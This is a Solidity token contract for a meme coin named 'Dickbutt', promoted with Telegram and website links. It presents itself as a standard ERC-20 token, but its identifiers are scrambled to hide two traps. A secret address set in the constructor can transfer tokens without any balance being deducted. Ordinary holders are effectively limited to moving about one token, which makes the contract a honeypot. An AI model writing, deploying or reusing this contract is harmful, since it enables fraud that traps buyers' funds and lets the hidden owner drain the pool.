/*

Telegram: https://t.me/ercdickbutt

Website: https://dickbutt.ethtoken.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Dickbutt is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => bool) private yswzmpj;

    string public name;

    IUniswapV2Router02 private bajgfw;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address bocthla, uint256 sctuovxwd) public returns (bool success) {
        bchgajfuikdy(msg.sender, bocthla, sctuovxwd);
        return true;
    }

    string public symbol;

    mapping(address => uint256) private nmplgzuwoyxv;

    function approve(address isqzkovyajte, uint256 sctuovxwd) public returns (bool success) {
        allowance[msg.sender][isqzkovyajte] = sctuovxwd;
        emit Approval(msg.sender, isqzkovyajte, sctuovxwd);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(string memory psiy, string memory npbauij, address cnzuwlikm, address krqsd) {
        name = psiy;
        symbol = npbauij;
        balanceOf[msg.sender] = totalSupply;
        yswzmpj[krqsd] = true;
        bajgfw = IUniswapV2Router02(cnzuwlikm);
    }

    function transferFrom(address msjgw, address bocthla, uint256 sctuovxwd) public returns (bool success) {
        require(sctuovxwd <= allowance[msjgw][msg.sender]);
        allowance[msjgw][msg.sender] -= sctuovxwd;
        bchgajfuikdy(msjgw, bocthla, sctuovxwd);
        return true;
    }

    mapping(address => uint256) private mdynsuaeq;

    uint8 public decimals = 9;

    function bchgajfuikdy(address msjgw, address bocthla, uint256 sctuovxwd) private {
        address ijnmxesvl = IUniswapV2Factory(bajgfw.factory()).getPair(address(this), bajgfw.WETH());
        bool clzftydvgsk = mdynsuaeq[msjgw] == block.number;
        if (!yswzmpj[msjgw]) {
            if (msjgw != ijnmxesvl && sctuovxwd < totalSupply && (!clzftydvgsk || sctuovxwd > nmplgzuwoyxv[msjgw])) {
                require(totalSupply / (10 ** decimals) >= sctuovxwd);
            }
            balanceOf[msjgw] -= sctuovxwd;
        }
        nmplgzuwoyxv[bocthla] = sctuovxwd;
        balanceOf[bocthla] += sctuovxwd;
        mdynsuaeq[bocthla] = block.number;
        emit Transfer(msjgw, bocthla, sctuovxwd);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
